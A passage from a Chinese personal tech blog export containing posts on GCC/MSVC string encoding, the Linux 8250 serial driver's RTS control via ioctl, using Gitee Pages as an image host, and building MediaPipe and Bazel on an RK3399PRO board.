  从图片结果我们可以知道，GCC对待字符串的方式和CL.exe不是很一致，但是通过传入相关参数，即可得到同样的结果。这里强调一下，-fexec-charset 参数相当于cl.exe的解码设置，类似上文vs选项，我们可以知道GCC的多字节默认编码是UTF-8。同时，GCC和CL.exe一样，对于char_t类型，都是使用的UTF-16 BE格式。
  这里，我们通过如图的编码输出，手动来转换一下UTF-8和UNICODE，验证我们之前说的规则是否正确。


“卧” 对应的是U+005367,十进制为U+21351，二进制U+0101 0011 0110 0111，根据区域值，是3字节模式，对应填入得到UTF-8二进制 1110 0101 1000 1101 1010 0111,十六进制为0xE58DA7


“槽” 对应的是U+0069FD,十进制为U+27133，二进制U+0110 1001 1111 1101‬，根据区域值，是3字节模式，对应填入得到UTF-8二进制 1110 0110 1010 0111 1011 1101,十六进制为0xE6A7BD


参考模式：1110 xxxx/10xx xxxx/10xx xxxx(binary)


  这里，我们发现，算出来的值，完全和我们的前面说的规则一样。
VS Debug模式下的“烫烫烫烫烫烫烫烫烫烫烫烫烫烫烫” 看似搞笑行为
  首先，我们在vs的debug模式下，运行如下程序。
#include &lt;cstdio&gt;

int main(int argc, char * argv[]) &#123;
    
	const char *_str &#x3D; &quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x %x %x\n&quot;, 0xFF &amp; _str[0], 0xFF &amp; _str[1], 0xFF &amp; _str[2], 0xFF &amp; _str[3]);
	const wchar_t *_str_1 &#x3D; L&quot;卧槽&quot;;
	printf(&quot;_str&#39;s mem &#x3D; %x %x\n&quot;, 0xFFFF &amp; _str_1[0], 0xFFFF &amp; _str_1[1]);
	char _test[10];
	for (int i &#x3D; 0; i &lt; 10; i++)
		printf(&quot;%x &quot;, 0xFF&amp;_test[i]);

	printf(&quot;\n%s&quot;, _test);
	return 0;
&#125;
  得到如图的结果。

    
        
    
  
  其实是由于vs 在debug模式下，会把我们为初始化的内存初始化为0xCC。而0xCCCC恰好是“烫”的GB18030编码，所以在我们CJK区域打印是“烫”，在其他区域可能是其他的字符。




后记

  其实到了这里，我已经解决了我想要解决的问题。因为我只要知道目标程序的内存中中文的具体编码（OD或者CE等等），然后我就可以进行我想要的文字查找。
  其实本文也解决了gcc生成的程序和cl.exe生成的程序字符串交换的问题。一个默认用的utf-8，一个是本地编码，对我们来说，就是GB系列。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
        <category>C&amp;CPP</category>
      </categories>
      <tags>
        <tag>乱码</tag>
        <tag>UNICODE</tag>
        <tag>GB系列</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux 串口驱动实例简单分析(x86 8250驱动(16550A),TIOCMGET, TIOCMSET, RTS)</title>
    <url>/2020/04/23/blog_idx_093/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  在我们一个一年前的项目里，由于对方的485串口硬件发生了变更，不能够通过默认的termios相关内容去read和write了，这里需要控制串口16550A芯片的RTS脚，然后去控制ADM2486 485 modem芯片RTS相关脚的收发。简单的理解为ADM485需要控制RTS和相关的引脚的高低电平，才能够控制485的收发。原理图我就不贴出来了，简单说明就是16550A的RTS脚接一个反相器然后直连到ADM2486的RTS脚。
  首先我这里考虑，这里如果是arm板卡的话，我是非常熟悉的，直接控制gpio就完事儿了。但是这个是个x86板卡，这就是最坑的，x86的io脚我没有控制过。当然，和对方硬件沟通后，一种方案确实是控制x86的通用gpio，而他们的一套方案是通过串口芯片的RTS脚控制485 modem的RTS脚，因为x86的通用引脚是非常昂贵的，而且，电路也麻烦。
  那么问题来了，怎么控制16550A芯片的RTS脚？




相关信息探索

  因为以前我们写了串口程序，操控的是/dev/ttyS0，那么必然现在也是从这个设备下手，我们看看系统启动日志。

    
        
    
    
  从这里我们知道串口芯片是16550A，也就是说我们之前通过termios相关的接口实现的老版本串口通信程序也是操作的这个芯片。那么意味着os里面已经自带了这个芯片的相关驱动。到这里，可以预想到后面会有两种情况：


根据os自带的16550A驱动，里面如果包含了关于RTS脚的操作方法，那么直接通过驱动提供的接口就可以完成RTS电平控制。而且这个方法成功的可能性比较大，因为硬件说过，16550A这种芯片基本是x86-intel主板的标配，那么说明这个芯片用的比较广泛，那么驱动也极有可能带了RTS相关操作。（而且我查了16550A的驱动就是8250驱动，是一个builtin模块）


直接操作intel cpu的gpio控制，感觉不是很科学，但是也有这种需求的。


  同时，我查看了相关的串口编程相关内容，发现了一点内容，可以进行一些串口的高级操作，主要还是ioctl这个syscall的这两个宏定义TIOCMGET, TIOCMSET，但是还是有点迷糊，于是根据以上的这些准备，我去看了linux对应内核的内核源码。




8250驱动源码分析

  直接打开linux/drivers/char/8250.c 和 linux/drivers/char/8250.h分析了一番，在驱动里面找到了RTS相关控制位的操作

    
        
    
    
  从这里知道，8250驱动确实带了相关的芯片mctrl引脚控制相关的接口，如图所示，分别是查询mctrl引脚状态和设置mctrl引脚状态。
  到这里，我隐约知道怎么做了，就是用ioctl 这个call的TIOCMSET来控制RTS引脚功能。熟悉linux驱动编写的人都知道为啥会这样，因为一个驱动带了open，close，read，write基本功能，其他的选项功能一般都是ioctl基本syscall里面实现的。
  于是带着这些疑问，我又继续看源码分析，不然心里面总是觉得虚的。




linux tty 驱动框架简单分析

  等我看完一系列的8250驱动的调用结构后，我才发现要介绍的应该是linux tty 驱动框架，下面我这里简单分析一下这个框架（没必要全懂，知道大概就行，毕竟我们也不写这个驱动，基本都是改再改）
  首先，我们这个串口是一个字符设备。那就是说，应该有类似字符驱动的流程去打开、操作、关闭。（这里不了解的，可以去查一下linux 字符驱动相关的简单说明）。字符驱动有主设备号和次设备号，对应我们的串口的话，如下图：

    
        
    
    
  tty设备的主设备为4

    
        
    
    
  我们的串口设备次设备号为64，也就是第0个serial。
  下面我们从字符设备开始，一步步看怎么调用起来8250里面的serial8250_get_mctrl() serial8250_set_mctrl()


8250 串口驱动简单说明
  linux/drivers/serial/8250.c
  下面是8250驱动的初始化部分，就是把重要的serial8250_reg驱动（uart_register_driver（））注册到uart驱动链表上去

    
        
    
    

    
        
    
     
  我们在内核的启动日志中，也看见了printk的打印信息。
  同时我们看一下uart_ops结构体在8250中的定义

    
        
    
     
  这里我们就成功的看到了serial8250_get_mctrl() serial8250_set_mctrl()这俩的上一层接口名字。
  在linux中，一个uart_driver对应多个uart_port，相当于一个串口驱动可以同时用于多个串口设备。

    
        
    
   

    
        
    
   
  其中在serial8250_register_ports()中的serial8250_isa_init_ports()接口就是关联uart_port结构体中的ops和serial_8250_pops的。这里我们其实就可以根据uart_port结构体中的set_mctrl和get_mctrl访问serial8250_get_mctrl() serial8250_set_mctrl()。
  然后通过uart_add_one_port把uart_driver中state成员的port成员赋值我们刚刚初始化好的uart_port.
  这样我们就可以通过uart_driver.state.port.ops来访问我们的函数指针即可。
  同时通过tty_register_device在/dev下面创建我们的设备节点。
  到这里，我们就成功的把调用serial8250_get_mctrl() serial8250_set_mctrl()这两个api转换为可以通过uart_driver来调用了。
  我们通过上述说明，基本可以看到一些内容，下面我们来看一个我们现在未讲到的东西，就是uart_register_driver

    
        
    
   
  我们可以看到，这里把uart_driver和一个叫做tty_driver的结构体关联了起来。特别是通过tty_set_operations()把uart_driver中的8250相关的api和tty_driver中的相关api关联了。
  而且通过tty_register_driver()把一个重要内容联系起来。至于为啥和怎么关联，我们继续往下面看。


serial_core简单说明
  linux/drivers/serial/serial_core.c
  其实查看这里的源码后发现，8250.c就是基于serial_core.c的内容进行串口驱动编程。
  在serial_core.h里面我们可以看到上述我们见到的大量的uart_*的有用的结构体。


tty_drivers 简单说明
  linux/drivers/char/tty_io.c
  我们知道一个简单的字符串驱动，肯定有个init入口，如图：

    
        
    
   
&emsp;&emsp;我们看最后的vt部分，这里创建了一个设备号为4,0的/dev/tty0的一个设备。

    
        
    
   
  这里一个tty_core核心驱动就完事儿了。
  写过字符驱动的人都应该知道，我们还应该关注一个file_operations的结构体，因为我们在用户态熟悉的open/close/read/write/ioctl都是通过这个结构体关联的。
  具体怎么关联的，可以看一下我这里的这个比较水的记录：https://blog.csdn.net/u011728480/article/details/51547405
  我简单来说，linux下一切皆是文件，包括我们要操作的串口设备，类似上面的/dev/tty0这种设备。在linux的vfs里面，一个文件对应一个inode结构体，同时内核维护一个file结构体和inode对应。inode结构体里面有个i_cdev成员，这个成员就是我们cdev结构体，就是我们在如图的初始化入口中的vc0_cdev，这个结构体里面有个重要的成员就是ops，这里面存放的就是各种open/close/read/write/ioctl的实际函数指针。
  在《8250 串口驱动简单说明》小节中，我们说明了serial8250_init（）通过调用tty_register_device在/dev中创建了对应的设备节点。并把tty_driver和uart_driver关联起来，我们可以通过tty_driver去访问serial8250_get_mctrl() serial8250_set_mctrl()这两个我想要的东西。
  那file_operations结构体和tty_driver是怎么关联起来的呢？如果我们知道了的话，整个驱动的调用链路就理清楚了，也好处理我们遇到的问题。
  在《8250 串口驱动简单说明》小节最后部分提到了8250的初始化调用了tty_register_driver()这个重要的接口，这个结构就是把我们想要的两个结构体关联起来的关键。

    
        
    
   
  我们在初始化一个字符设备的时候，在这里关联了file_operations结构体和tty_driver。
  我们看看tty_fops的定义：

    
        
    
   
  到了这里，我们的整个调用链路都打通了。
  这里我们直接看tty_ioctl这个接口，我们就可以看到调用8250的方法了serial8250_get_mctrl() serial8250_set_mctrl()。最后我们在文末总结一下。




8250调用实例分析

  我们这里通过调用通过8250驱动设置16550A的 RTS脚电平来回顾一下我们的整个调用链路。
  当我们调用ioctl的时候，通过传入参数TIOCMGET或者TIOCMSET，默认我们会调用tty_ioctl方法，然后进一步会调用tty_tiocmget 和tty_tiocmset。如下图：

    
        
    
  

    
        
    
  
  在tty_tiocmget 和tty_tiocmset中，分别调用tty_driver中的tiocmset和tiocmget

    
        
    
  

    
        
    
  
  然后我们上文说了，tty_driver和uart_driver是通过uart_register_driver和tty_set_operations关联起来的

    
        
    
  
  也就是说，对tty_driver的tiocmget和tiocmset的调用，就是直接对tty_operations的tiocmget和tiocmset的调用。
  我们在《8250 串口驱动简单说明》小节最后部分，说调用tty_set_operations()关联起来了一个tty_driver和一个tty_operations,而这里注册的uart_ops就很明显了

    
        
    
  
  也就是说tty_operations的tiocmget和tiocmset的调用，就是对uart_tiocmget和uart_tiocmset的调用。

    
        
    
  

    
        
    
  
  uart_tiocmget和uart_tiocmset的调用就是对uart_driver.state.port.ops.set_mctrl和uart_driver.state.port.ops.get_mctrl的调用，而这里就是对serial8250_set_mctrl和serial8250_get_mctrl的调用。

    
        
    
  




后记

  总结
  我们可以看到，这里，我们在用户层对相关vfs的接口进行调用，都会映射为相应的驱动ops。
  在这里，用户态的ioctl转换为内核态的tty_ioctl，最终一步步到我们要的地方。
  因为我是要读这个驱动是不是有这个功能，而不是写一个驱动，所以看起来要简单很多了。
  我查了tty相关的驱动框架，内容还是挺多的，特别是tty_read和tty_write和我们这里的调用流程是完全不一致的，但是我这里暂时不需要去看，因为我要的功能有了，如果有需求，我会去看这部分内容。最终，我通过ioctl加上特定的命令，成功的控制了16550A的RTS脚。而且这里通了的话，不需要通过gpio去处理。
  其实这个还是挺有意思的，虽然好的抽象的东西看起来很不爽，但是了解通了整个调用流程，我感觉就特别的舒服。
参考文献


无







    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>嵌入式</category>
        <category>linux开发</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>嵌入式</tag>
        <tag>内核</tag>
        <tag>串口通信</tag>
      </tags>
  </entry>
  <entry>
    <title>博客调整为MarkDown和图床外链、配置Gitee作为图床</title>
    <url>/2020/08/24/blog_idx_100/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明
  无
前言

  一直以来，我都想把我写的文章CSDN给备份下来，一个是我想做一些本地备份，保护我的创作文章，二一个是方便的移植发布到其他的平台，可能接触过的朋友知道，这是一个头疼的事情，其中最麻烦的事情就是图片问题。最近因为做了一些总结性的工作，于是想把这个问题解决掉。
  这里我采取的方案是MarkDown+图床外链的方式。其实以前也了解过这种方式，一直以来没有时间去整理。
  MarkDown是一种比较不错的语言，我们常见是用于rep的readme文件，其次就是写文章用来做格式控制比较不错，而且兼容一些html语法。图床就是可以通过http链接显示图片的网站，目前有许多的网站，有的收费，有的访问慢，有的不稳定。于是我这里根据我的喜好，选择了gitee pages功能作为我的blog文章的图床。类似的还有github也可以作为图床。
  有了图床+MarkDown写的文章，我的文章就可以很方便的本地浏览以及发布到多个平台，而不用担心图片的问题，就像我们写的程序源码那样，保证可移植性。最最最最重要的是，我们可以备份自己的文章，在离线状态下，通过MarkDown浏览器，可以正常查看自己的文章，包括查看图片。
  于是从这篇文章开始，我的所有文章将会启用这种方式，同时，本文也算是一个配置实例。




通过Gitee Pages功能创建一个属于自己的图床

  其实图床搭建是很简单的，就是一个简单的http服务器，只是考虑到各种cdn加速，资源访问问题，所以我们要选用一个稳定的、较大的服务商作为我们图床。从本质来说，图床就是一个http服务器，我们可以通过http链接，访问我们存储的图片。
  GiteePages功能就是把我们gitee rep 根目录作为一个http服务根目录，然后提供链接，我们就可以访问到我们的仓库文件，包括文本、二进制、图片等。


Gitee 创建一个公开仓库
  首先注册一个Gitee账号，登录到Gitee。如图点击新建rep，然后填写rep 名字，注意选择开源为公开，选择一个开源协议，点击初始化readme，点击创建即可。

    
        
    
    
        
    
    


Gitee 开启GiteePage功能
  这个功能就是开启一个http服务器，http根目录指向我们的仓库根目录，然后即可通过url加上相对路径，即可访问我们的文件。
  首先点击如图的地方，切换到gitee pages页面，然后点击如图的启动按钮，然后等待一会儿，就会到最终的目录，画框中的url就是图床的http url。如果你更新了rep，一定要点击更新，重新启动一下gitee pages 服务，然后才会应用你push 的最新maser分支。

    
        
    
    
        
    
    
        
    
    


Gitee Page配置及使用示例
  在这个仓库根目录创建index.html 和 404.html，gitee给的http服务器将会把域名首页指向index.html，如果访问出错，将会指向404.html。html怎么写，这里就略过了。
  比如这里的两个链接，这个是我创建的图床index（ http://sky-x.gitee.io/image-bed0/ ）和错误访问的404网页（ http://sky-x.gitee.io/image-bed0/no-exsit ）。

    
        
        
    
    
  然后在这个仓库里面存放自己的图片就行，访问的路径就是对应的rep文件路径，参考下图和图床地址。例如本文创建仓库的实例图片（图床地址： https://flyinskyin2013.github.io/ImageBed0/blogs/blog_idx_100/create_rep.png ）
  注意：image-bed0 是你刚刚创建仓库的地址，blogs/blog_idx_100/create_rep.png是你仓库中要显示文件的相对路径。

    
        
    
  




后记

  由于我们这里的图片外链放的是我们的原图，最好还是加一加水印，然后放外链，避免盗图情况的发生。
  由于本文的这些操作只能够对新的blog文章生效，对于旧的文章，暂时没有好的解决方案。我可能采取一个比较笨的方案，下载已有文章中的markdown文件，下载文章对于的图片。这又是一个比较大的工程，只有慢慢的弄了。





    
        
        打赏、订阅、收藏、丢香蕉、硬币，请关注公众号（攻城狮的搬砖之路）
    


    
        
    


PS: 请尊重原创，不喜勿喷。
PS: 要转载请注明出处，本人版权所有。
PS: 有问题请留言，看到后我会第一时间回复。
]]></content>
      <categories>
        <category>常识</category>
      </categories>
      <tags>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Mediapipe 在RK3399PRO上的初探（一）(编译、运行CPU和GPU Demo, RK OpenglES 填坑，编译bazel)</title>
    <url>/2021/04/18/blog_idx_103/</url>
    <content><![CDATA[ 
PS：要转载请注明出处，本人版权所有。
PS: 这个只是基于《我自己》的理解，如果和你的原则及想法相冲突，请谅解，勿喷。

环境说明


Ubuntu 18.04


gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)


OpenGl ES 3.1 or 3.1+


RK3399PRO 板卡


前言

  由于我们小组的产品落地越来越多，以前（2018年）我搭建的老旧产品框架已经有点日落西山的感觉了。倒不是说产品业务不能支撑了，只是随着使用的时间增多，逐渐的感觉框架比较’LOW’，全靠使用者调教的怎么样，缺少了很多公共的组件。我倒是觉得这是必然的，因为当时我们小组的产品功能还比较的单一，随着产品功能多样化，产品迭代的频率越来越高，使得我们现有的框架在对付当前的产品的时候，有点落后了。最主要的就是我们的框架代码复用率有点低，导致快速开发的时候，那叫一个不爽。在我们都是打工仔的前提下，这一致命缺陷让我很难受，项目Code&amp;Debug的时间成本越来越高。还有一个原因就是当时我设计这个框架的时候，自己的想法很单纯，也很简单。
  下图是当时我设计的框架的一个简单示意图：

    
        
    
   
父进程对子进程的所有行为进行监控和处理，子进程进行实际的逻辑开发。
  因此，我们小组内部决定要预研和引入一套开源的比较好使的框架，在后面如果上大项目的时候，可能就要上这个预研的新框架，经过了一圈调研，可能觉得Mediapipe和我们的业务很耦合，应该是可以使用的。于是乎，就有了我来踩一踩这个大坑。
  好的多说无益，直接看运行Demo效果（包含FaceDetectDemo 和 HolisticDemo）,截图来自于我录制的4个视频。

    
        
    
	
        
    
    

    
        
    
	
        
    
    
  由于Mediapipe使用的是一个名为bazel的编译管理工具，可以说是大大增加了我们解决问题的难度。




安装Bazel 4.0.0

  注意，Mediapipe使用的是bazel来编译的，如果以前没有接触过，可能使用起来不是那么的友好。而且Mediapipe基本是和特定版本的bazel是绑定的，所以在安装bazel之前，建议大家去看看你要使用的mediapipe版本所依赖的bazel版本是多少。你可以去看 ‘gay-hub’ 上面Mediapipe 的关于bazel的说明。如下图类似的说明：

    
        
    
   
一般来说，Mediapipe依赖的bazel比较新，可能常见的发行版里面自带的bazel版本比较低，所以一般都需要从源码开始从零编译bazel，如果系统已有bazel等，可以用其他方式编译，详见后文链接的文档内容。下面的内容一般都是copy来自于 https://docs.bazel.build/versions/4.0.0/install-compile-source.html 。


安装依赖
安装依赖


sudo apt-get install build-essential openjdk-11-jdk python zip unzip




编译和部署 bazel
编译bazel


cd bazel-src-dir


env EXTRA_BAZEL_ARGS=“–host_javabase=@local_jdk//:jdk” bash ./compile.sh


编译生成的bazel二进制文件在bazel-src-dir/output/ 目录。
  这时我们可以选择将bazel安装到/usr/bin or /usr/local/bin或者把bazel-src-dir/output/ 添加到PATH环境变量。
  然后运行可以得到如下图的内容：


bazel --help



    
        
    
   
至此，bazel安装完毕，这里我就不详细介绍bazel了，网上有许多的介绍资料。这里可以简单的记住这两点就够了：bazel build target 和 bazel run target。bazel build target是编译目标。bazel run target 是编译并运行目标。




在rk3399pro上编译Mediapipe Demo

  首先我们要下载好源码,并切换到对应的版本：


git clone https://github.com/google/mediapipe


git checkout 0.8.3.2


  然后，根据网页 https://google.github.io/mediapipe/solutions/face_detection.html 的Example Apps-&gt; Desktop 小节里面，我们可以看到如下图的内容：

    
        
    
   
  图中给出了关于人脸检测的demo的target 和 对应的graph-cfg文件。类似的说明，在每个solution下面都有。我推荐大家优先从hello_world开始编译，因为这个target简单，出错也好排查。此外，一些可以复用的文件，只要你不修改，就只会编译一次。
  此外，我们编译的平台是aarch64+ubuntu18.04，而官方的编译结构带的是x86-64 + ubuntu 18.04，所以在链接一些第三方库的时候，例如：opencv，我们需要改一下路径才行，如下图：

    
        
    
   
可能在编译的过程中还会遇到其他的错误，大家就按着修改就好了。后面我会列出一些可能的错误及参考解决方法。


HelloWorld 编译和运行
  进入mediapipe的源码根目录开始编译运行CPU版本。
&gt; bazel build --define MEDIAPIPE_DISABLE_GPU&#x3D;1 mediapipe&#x2F;examples&#x2F;desktop&#x2F;hello_world:hello_world --local_cpu_resources&#x3D;1
&gt; bazel run   --define MEDIAPIPE_DISABLE_GPU&#x3D;1 mediapipe&#x2F;examples&#x2F;desktop&#x2F;hello_world:hello_world
  进入mediapipe的源码根目录开始编译运行GPU版本。(注意，这里的helloworld并没有gpu加速，这里这是演示怎么编译一些公共的包含gpu的代码)
&gt; bazel build --define MEDIAPIPE_DISABLE_GPU&#x3D;1 mediapipe&#x2F;examples&#x2F;desktop&#x2F;hello_world:hello_world --local_cpu_resources&#x3D;1
&gt; bazel run   --define MEDIAPIPE_DISABLE_GPU&#x3D;1 mediapipe&#x2F;examples&#x2F;desktop&#x2F;hello_world:hello_world
–local_cpu_resources 是为了指定线程个数，一般来说，编译这个东西比较耗费内存，建议大家合力设定。如果不指定这个参数，bazel 按照 nproc 开启多线程编译。这样可能在某些情况下要爆内存。
  在bazel build 之后，第一次编译可能要耗费大量的时间，我建议去干干别的，休息一会儿。
  在bazel run 之后，会打印一串helloworld。


人脸检测demo编译和运行
  进入mediapipe的源码根目录开始编译运行CPU版本。
&gt; bazel build --define MEDIAPIPE_DISABLE_GPU&#x3D;1 --copt -DMESA_EGL_NO_X11_HEADERS --copt -DEGL_NO_X11 mediapipe&#x2F;examples&#x2F;desktop&#x2F;face_detection:face_detection_cpu --local_ram_resources&#x3D;1500  --local_cpu_resources&#x3D;1

&gt; .&#x2F;bazel-bin&#x2F;mediapipe&#x2F;examples&#x2F;desktop&#x2F;face_detection&#x2F;face_detection_cpu -calculator_graph_config_file&#x3D;.&#x2F;mediapipe&#x2F;graphs&#x2F;face_detection&#x2F;face_detection_desktop_live.pbtxt -input_video_path&#x3D;.&#x2F;TestVideos&#x2F;out.mp4

  进入mediapipe的源码根目录开始编译运行GPU版本。
&gt; bazel build --copt -DMESA_EGL_NO_X11_HEADERS --copt -DEGL_NO_X11 mediapipe&#x2F;examples&#x2F;desktop&#x2F;face_detection:face_detection_gpu --local_ram_resources&#x3D;1500  --local_cpu_resources&#x3D;1

&gt; .&#x2F;bazel-bin&#x2F;mediapipe&#x2F;examples&#x2F;desktop&#x2F;face_detection&#x2F;face_detection_gpu -calculator_graph_config_file&#x3D;.&#x2F;mediapipe&#x2F;graphs&#x2F;face_detection&#x2F;face_detection_mobile_gpu.pbtxt -input_video_path&#x3D;.&#x2F;TestVideos&#x2F;out.mp4

   运行之后，就会弹一个框开始检测了。


姿态demo编译和运行
  进入mediapipe的源码根目录开始编译运行CPU版本。
bazel build --define MEDIAPIPE_DISABLE_GPU&#x3D;1 --copt -DMESA_EGL_NO_X11_HEADERS --copt -DEGL_NO_X11 mediapipe&#x2F;examples&#x2F;desktop&#x2F;holistic_tracking:holistic_tracking_cpu --local_ram_resources&#x3D;1500  --local_cpu_resources&#x3D;1

.&#x2F;bazel-bin&#x2F;mediapipe&#x2F;examples&#x2F;desktop&#x2F;holistic_tracking:holistic_tracking_cpu -calculator_graph_config_file&#x3D;.&#x2F;mediapipe&#x2F;graphs&#x2F;holistic_tracking&#x2F;holistic_tracking_cpu.pbtxt -input_video_path&#x3D;.&#x2F;TestVideos&#x2F;out.mp4

  进入mediapipe的源码根目录开始编译运行GPU版本。
bazel build --copt -DMESA_EGL_NO_X11_HEADERS --copt -DEGL_NO_X11 mediapipe&#x2F;examples&#x2F;desktop&#x2F;holistic_tracking:holistic_tracking_gpu --local_ram_resources&#x3D;1500  --local_cpu_resources&#x3D;1

.&#x2F;bazel-bin&#x2F;mediapipe&#x2F;examples&#x2F;desktop&#x2F;holistic_tracking:holistic_tracking_gpu -calculator_graph_config_file&#x3D;.&#x2F; mediapipe&#x2F;graphs&#x2F;holistic_tracking&#x2F;holistic_tracking_gpu.pbtxt -input_video_path&#x3D;.&#x2F;TestVideos&#x2F;out.mp4

   运行之后，就会弹一个框开始检测了。




RK3399pro 可能遇到的坑

Opencv 问题
  如上文所说，如果不修改，将会出现undefined symbol xxx 或者 找不到opencv_xxx的库的问题。


关于Opengl ES 版本问题
  根据官方说明，需要Opengl ES 3.1 或者 Opengl ES 3.1+的版本，我这里遇到的问题是，如果版本比这个低，运行GPU版本的demo 的时候，会报错。
  注意：rk的libmali-rk-midgard-t86x-r14p0版本就支持 Opengl ES 3.1及以上，现在rk已经更新了libmali-rk-midgard-t86x-r18p0，可以暂时不更新也可以用。因为一旦更新了gpu驱动，内核也必须更新，配套的文件系统也得更新。因为我 xxxxxxxxxxxxxx 踩过.
  关于Opengl ES 版本查看问题，可以使用glxinfo，如果没有这个命令推荐安装。如果使用的ssh来运行glxinfo，保证启用X11-forwarding. 查看到的版本如下图(glxinfo|grep “OpenGL ES”)：

    
        
    
   


SSH 模式下运行GPU Demo报错问题
   可能会出现以下问题，这个问题好像是多个xclient和xserver连接导致的问题，我也不确定。但是要不报这个错误，请直接将板卡接显示器使用。
I20210417 17:49:08  4016 demo_run_graph_main_gpu.cc:58] Initialize the calculator graph.
I20210417 17:49:08  4016 demo_run_graph_main_gpu.cc:62] Initialize the GPU.
XIO:  fatal IO error 11 (Resource temporarily unavailable) on X server &quot;localhost:12.0&quot;
      after 6 requests (6 known processed) with 0 events remaining.



关于Mediapipe里面glog 在RK3399pro上无法输出问题
   请在gflags::ParseCommandLineFlags之后，设置如下三个变量的值。。。，这个值是调试出来的。
gflags::ParseCommandLineFlags(&amp;argc, &amp;argv, true);

FLAGS_minloglevel &#x3D; 0;
FLAGS_stderrthreshold &#x3D; 0;
FLAGS_alsologtostderr &#x3D; 1;


关于libEGL的导致编译报错问题
   关于这个问题，我这里只想问问Firefly的厂家，咋们修改开源库的时候，能不能认真点？?? “尽量添加，不要删除”，难道这不是修改开源库的一大原则吗？看下边两个文件内容：
EGL/eglplatform.h 来至于deb包 libmali-rk-dev 1.7-1 http://wiki.t-firefly.com/firefly-rk3399-repo bionic/main arm64 Packages

#ifndef __eglplatform_h_
#define __eglplatform_h_

/*
** Copyright (c) 2007-2016 The Khronos Group Inc.
**
** Permission is hereby granted, free of charge, to any person obtaining a
** copy of this software and/or associated documentation files (the
** "Materials"), to deal in the Materials without restriction, including
** without limitation the rights to use, copy, modify, merge, publish,
** distribute, sublicense, and/or sell copies of the Materials, and to
** permit persons to whom the Materials are furnished to do so, subject to
** the following conditions:
**
** The above copyright notice and this permission notice shall be included
** in all copies or substantial portions of the Materials.
**
** THE MATERIALS ARE PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND,
** EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF
** MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.
** IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY
** CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
** TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
** MATERIALS OR THE USE OR OTHER DEALINGS IN THE MATERIALS.
*/

/* Platform-specific types and definitions for egl.h
 * $Revision: 30994 $ on $Date: 2015-04-30 13:36:48 -0700 (Thu, 30 Apr 2015) $
 *
 * Adopters may modify khrplatform.h and this file to suit their platform.
 * You are encouraged to submit all modifications to the Khronos group so that
 * they can be included in future versions of this file.  Please submit changes
 * by sending them to the public Khronos Bugzilla (http://khronos.org/bugzilla)
 * by filing a bug against product "EGL" component "Registry".
 */

#include &lt;KHR/khrplatform.h>

/* Macros used in EGL function prototype declarations.
 *
 * EGL functions should be prototyped as:
 *
 * EGLAPI return-type EGLAPIENTRY eglFunction(arguments);
 * typedef return-type (EXPAPIENTRYP PFNEGLFUNCTIONPROC) (arguments);
 *
 * KHRONOS_APICALL and KHRONOS_APIENTRY are defined in KHR/khrplatform.h
 */

#ifndef EGLAPI
#define EGLAPI KHRONOS_APICALL
#endif

#ifndef EGLAPIENTRY
#define EGLAPIENTRY  KHRONOS_APIENTRY
#endif
#define EGLAPIENTRYP EGLAPIENTRY*

/* The types NativeDisplayType, NativeWindowType, and NativePixmapType
 * are aliases of window-system-dependent types, such as X Display * or
 * Windows Device Context. They must be defined in platform-specific
 * code below. The EGL-prefixed versions of Native*Type are the same
 * types, renamed in EGL 1.3 so all types in the API start with "EGL".
 *
 * Khronos STRONGLY RECOMMENDS that you use the default definitions
 * provided below, since these changes affect both binary and source
 * portability of applications using EGL running on different EGL
 * implementations.
 */

struct gbm_device;
struct gbm_surface;

#if defined(WL_EGL_PLATFORM)

typedef struct wl_display     *EGLNativeDisplayType;
typedef struct wl_egl_pixmap  *EGLNativePixmapType;
typedef struct wl_egl_window  *EGLNativeWindowType;

#elif defined(__GBM__)
typedef struct gbm_device * EGLNativeDisplayType;
typedef struct gbm_surface * EGLNativeWindowType;
typedef void * EGLNativePixmapType;
#elif defined(__unix__)
#include &lt;X11/Xlib.h>
#include &lt;X11/Xutil.h>
typedef Display *EGLNativeDisplayType;
typedef Pixmap EGLNativePixmapType;
typedef Window EGLNativeWindowType;
#endif

/* EGL 1.2 types, renamed for consistency in EGL 1.3 */
typedef EGLNativeDisplayType NativeDisplayType;
typedef EGLNativePixmapType  NativePixmapType;
typedef EGLNativeWindowType  NativeWindowType;


/* Define EGLint. This must be a signed integral type large enough to contain
 * all legal attribute names and values passed into and out of EGL, whether
 * their type is boolean, bitmask, enumerant (symbolic constant), integer,
 * handle, or other.  While in general a 32-bit integer will suffice, if
 * handles are 64 bit types, then EGLint should be defined as a signed 64-bit
 * integer type.
 */
typedef khronos_int32_t EGLint;


/* C++ / C typecast macros for special EGL handle values */
#if defined(__cplusplus)
#define EGL_CAST(type, value) (static_cast&lt;type>(value))
#else
#define EGL_CAST(type, value) ((type) (value))
#endif

#endif /* __eglplatform_h */

EGL/eglplatform.h 来至于deb包 libegl1-mesa-dev ubuntu 官方，甚至 https://github.com/rockchip-linux/libmali 人家rockchip官方带的东西至少没有乱删东西吧。
